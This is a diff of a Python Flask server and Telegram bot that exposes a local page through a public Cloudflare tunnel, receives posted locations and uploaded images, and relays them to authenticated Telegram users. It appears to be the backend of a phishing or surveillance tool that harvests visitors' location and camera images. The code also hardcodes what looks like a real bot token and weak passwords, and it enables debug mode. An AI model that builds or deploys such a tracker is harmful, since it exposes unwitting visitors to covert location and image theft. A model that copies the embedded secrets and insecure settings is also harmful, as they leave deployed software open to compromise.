@@ -1,45 +1,31 @@
-from flask import Flask, request, jsonify, send_file, abort
+from flask import Flask, request, jsonify, send_file
 from flask_httpauth import HTTPBasicAuth
 import sqlite3
 from datetime import datetime
 import os
-import asyncio
+import subprocess
 import threading
-from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
-from telegram import Update
+import time
+import re
+import webbrowser
+import asyncio
+import traceback
 import requests
-from os import environ as env
-from dotenv import load_dotenv
+from telegram import Update
+from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
 
 # -------------------- Flask Setup --------------------
 app = Flask(__name__)
 auth = HTTPBasicAuth()
+users = {"admin": "pass123"}
 
-try:
-    from dotenv import load_dotenv
-    load_dotenv()  # This will only work locally
-except ImportError:
-    pass  # On Render, we'll use regular environment variables
+@auth.verify_password
+def verify_password(username, password):
+    return username if username in users and users[username] == password else None
 
-# -------------------- Configuration --------------------
-TELEGRAM_BOT_TOKEN = env.get('TELEGRAM_BOT_TOKEN')
-if not TELEGRAM_BOT_TOKEN:
-    raise ValueError("Telegram bot token not found in environment variables")
-
-AUTHORIZED_KEY = env.get('AUTHORIZED_KEY')
-if not AUTHORIZED_KEY:
-    raise ValueError("AUTHORIZED KEY NOT FOUND")
-
-users = {
-    env.get('ADMIN_USER', 'admin'): env.get('ADMIN_PASSWORD', 'pass')
-}
-
-# -------------------- Path Setup --------------------
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-STATIC_DIR = os.path.join(BASE_DIR, 'static')
-SAVE_FOLDER = os.path.join(BASE_DIR, 'saved_files')
+# -------------------- Folder Setup --------------------
+SAVE_FOLDER = "saved_files"
 os.makedirs(SAVE_FOLDER, exist_ok=True)
-os.makedirs(STATIC_DIR, exist_ok=True)
 
 # -------------------- Database Setup --------------------
 def init_db():
@@ -60,13 +46,53 @@ def init_db():
 
 init_db()
 
-# -------------------- Telegram Bot Functions --------------------
+# -------------------- Cloudflared Tunnel --------------------
+def start_cloudflared(timeout=30):
+    try:
+        cloudflared_path = os.path.join(os.getcwd(), "cloudflared.exe")
+        process = subprocess.Popen(
+            [cloudflared_path, "tunnel", "--url", "http://localhost:5000"],
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True
+        )
+        print("[✓] Starting Cloudflare tunnel...")
+
+        start_time = time.time()
+        for line in process.stdout:
+            print("[cloudflared]", line.strip())
+            if "https://" in line and "trycloudflare.com" in line:
+                match = re.search(r"(https://[^\s]+)", line)
+                if match:
+                    url = match.group(1)
+                    print(f"[🌐] Public URL: {url}")
+                    return url
+
+            if time.time() - start_time > timeout:
+                print("[!] Timeout: Tunnel URL not found.")
+                process.terminate()
+                break
+
+    except FileNotFoundError:
+        print("[ERROR] 'cloudflared.exe' not found in current directory.")
+    except Exception as e:
+        print(f"[ERROR] Failed to start Cloudflare tunnel: {e}")
+
+    return None
+
+# -------------------- Telegram Bot Setup --------------------
+TELEGRAM_BOT_TOKEN = "8068204110:AAELqo2Dres3tX5pvlC5O2wopyqFwaP2AM0"  # Replace with your actual bot token
+AUTHORIZED_KEY = "secretkey123"
 authenticated_users = set()
 
 def send_telegram_message(message):
     for user_id in authenticated_users:
         url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        data = {"chat_id": user_id, "text": message, "parse_mode": "Markdown"}
+        data = {
+            "chat_id": user_id,
+            "text": message,
+            "parse_mode": "Markdown"
+        }
         requests.post(url, data=data)
 
 def send_telegram_image(image_path, caption=""):
@@ -82,7 +108,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if user_id not in authenticated_users:
         await update.message.reply_text("🔒 Please authenticate using /auth <key>")
         return
-    await update.message.reply_text("✅ Server is live!")
+    tunnel_url = context.bot_data.get("tunnel_url", "⚠️ Tunnel URL not available.")
+    await update.message.reply_text(f"✅ Server is live!\n🌐 URL: {tunnel_url}")
 
 async def auth(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -119,22 +146,31 @@ async def delete(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     await update.message.reply_text(f"🗑️ Deleted {deleted_files} image(s) and cleared database.")
 
-def run_bot():
-    """Run the Telegram bot in the main thread"""
-    app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("auth", auth))
-    app.add_handler(CommandHandler("chatid", chatid))
-    app.add_handler(CommandHandler("delete", delete))
-    app.run_polling()
+def start_bot(tunnel_url):
+    try:
+        print("[🤖] Starting Telegram bot...")
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+
+        app = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
+        app.bot_data["tunnel_url"] = tunnel_url
+
+        app.add_handler(CommandHandler("start", start))
+        app.add_handler(CommandHandler("auth", auth))
+        app.add_handler(CommandHandler("chatid", chatid))
+        app.add_handler(CommandHandler("delete", delete))
+
+        app.run_polling(close_loop=False)
+        print("[✅] Telegram bot is running!")
+
+    except Exception as e:
+        print(f"[❌] Bot failed to start: {e}")
+        traceback.print_exc()
 
 # -------------------- Flask Routes --------------------
 @app.route('/')
 def index():
-    index_path = os.path.join(STATIC_DIR, 'index.html')
-    if not os.path.exists(index_path):
-        abort(404, description="Index file not found")
-    return send_file(index_path)
+    return send_file('static/index.html')
 
 @app.route('/location', methods=['POST'])
 def receive_location():
@@ -187,14 +223,12 @@ def upload_image():
 
     return jsonify({"status": "OK"}), 200
 
-# -------------------- Main Execution --------------------
+# -------------------- Main --------------------
 if __name__ == '__main__':
-    # Start Flask app in a separate thread
-    flask_thread = threading.Thread(
-        target=lambda: app.run(host='0.0.0.0', port=5000, debug=False, use_reloader=False)
-    )
-    flask_thread.daemon = True
-    flask_thread.start()
-
-    # Run Telegram bot in main thread
-    run_bot()
+    tunnel_url = start_cloudflared()
+    if tunnel_url:
+        threading.Thread(target=start_bot, args=(tunnel_url,), daemon=True).start()
+        webbrowser.open(tunnel_url)
+        app.run(host='127.0.0.1', port=5000, debug=True, use_reloader=False)
+    else:
+        print("❌ Could not start tunnel. Bot and server not started.")
